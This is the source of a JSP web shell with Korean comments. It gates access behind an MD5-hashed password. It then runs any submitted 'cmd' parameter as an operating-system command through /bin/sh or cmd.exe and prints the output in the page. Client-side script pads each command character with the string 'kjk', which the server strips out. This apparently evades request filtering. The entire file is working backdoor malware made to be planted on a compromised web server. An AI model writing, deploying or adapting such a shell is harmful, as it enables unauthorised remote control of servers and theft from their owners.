<%@ page contentType="text/html; charset=UTF-8" %>
<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.security.*" %>
<%
    String cmd = request.getParameter("cmd"); // GET & POST
    Process ps = null;
    BufferedReader br = null;
    String line = ""; // 결과값 한 줄씩
    String result = "";
    // String now_page = request.getServletPath(); // 현재 페이지명 // /ROOT 아래 경로만, webapps에 올리면 전체 경로 반환하지 못함 => full path 필요
    String password = "81dc9bdb52d04dc2036dbd8313ed055";
    String input_password = request.getParameter("password");
    String id = (String)session.getAttribute("erh3bbsfgyui3vb4kjn");
    String os = System.getProperty("os.name").toLowerCase();
    String shell = "";
    StringBuffer sb = new StringBuffer();
    sb.append(request.getRequestURL());
    // out.println(sb.toString());
    String full_path = sb.toString();
	String desultory = "kjk";

    try 
    {
        if ( ( id == null || id.equals("") ) && ( input_password == null || input_password.equals("") ) ) 
        {
            %>
                <form action="<%=full_path%>" method="POST">
					<input type="password" name="password">
					<input type="submit" value="a">
                </form>
            <%
            return;
        } 
        else if ( ( id == null || id.equals("") ) && ( input_password != null || ! input_password.equals("") ) ) 
        {
			// encrypt
			MessageDigest md = MessageDigest.getInstance("MD5");
			String plaintext = input_password;
			byte[] byteData = plaintext.getBytes();
			md.update(byteData);
			byte[] digest = md.digest();
			String encData = "";
			for(int i = 0; i < digest.length; i++)
			{
				encData = encData + Integer.toHexString(digest[i] & 0xFF).toLowerCase();
			}
			out.println(encData);
			input_password = encData;
			
            if ( password.equals(input_password) ) 
            {
                session.setAttribute("erh3bbsfgyui3vb4kjn", "g3h8fiu0daf1sb2hg");
                response.sendRedirect(full_path); // 새로 고침
            }
            else
            {
                response.sendRedirect(full_path); // 새로 고침
				out.println("xxx");
                return;
            }
        }

        if ( cmd != null && ! cmd.equals("") ) 
        {
            cmd = cmd.replace(desultory, "");
            shell = ( os.indexOf("win") == -1 ) ? "/bin/sh -c " : "cmd.exe /c ";

            ps = Runtime.getRuntime().exec(shell + cmd);

            // 바이트 스트림(바이트 단위 연속적인 데이터) -> 문자 스트림 -> 버퍼에 넣어 한 번에 처리
            br = new BufferedReader(new InputStreamReader(ps.getInputStream()));
            while((line = br.readLine()) != null) { // 개행문자까지 읽기
                result += line + "<br>"; // 브라우저 개행 처리
            }
			
            ps.destroy();
        }
    } finally {
        if ( br != null ) br.close();
    }
%>

<script>
    // https://developer.mozilla.org/en-US/docs/Web/Events 이벤트 종류
    //document.cmdForm.cmd.addEventListener('keydown', (event) => {
	document.addEventListener('keydown', (event) => {
        if ( event.keyCode === 13 ) {
            cmdRequest();
        }
    });

    function cmdRequest() {
        const cmdForm = document.cmdForm;
        const cmd = cmdForm.cmd.value;
        let enc_cmd = '';
		
        for (var i = 0; i < cmd.length; i++) {
            //enc_cmd += cmd.charAt(i) + '###';
			enc_cmd += cmd.charAt(i) + '<%=desultory%>';
        }
		console.log(enc_cmd);

        cmdForm.cmd.value = enc_cmd;
        cmdForm.action = '<%=full_path%>';
        cmdForm.submit();
    }
</script>

<form name="cmdForm" method="POST">
	<input type="text" name="cmd" class="cmd" autofocus>
</form>

<hr>

<% if ( cmd != null && ! cmd.equals("") && ! result.equals("") ) { %>
    <p>>> <%=cmd%></p>
	
    <table style="border: 1px solid black; background-color: black">
        <tr>
            <td style="color: white; font-size: 15px"><%=result%></td>
        </tr>
    </table>
	
<% } else { %>
    <p>>></p>
<% } %>
